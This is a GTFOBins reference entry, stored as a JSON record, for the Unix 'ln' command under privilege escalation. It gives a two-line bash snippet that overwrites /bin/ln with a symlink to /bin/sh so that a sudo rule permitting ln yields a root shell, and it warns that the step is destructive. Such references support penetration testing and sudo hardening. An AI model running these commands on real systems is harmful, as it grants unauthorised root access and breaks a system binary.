{"title": "ln", "source": "gtfobins", "source_label": "GTFOBins", "path": "ln", "html": "<h1>ln</h1>\n<h2>Privilege Escalation</h2>\n<p>This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.</p>\n<pre><code class=\"language-bash\">ln -fs /bin/sh /bin/ln\nln</code></pre>", "excerpt": "ln Privilege Escalation This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action. ln -fs…", "tags": ["func:privilege-escalation", "ctx:sudo"]}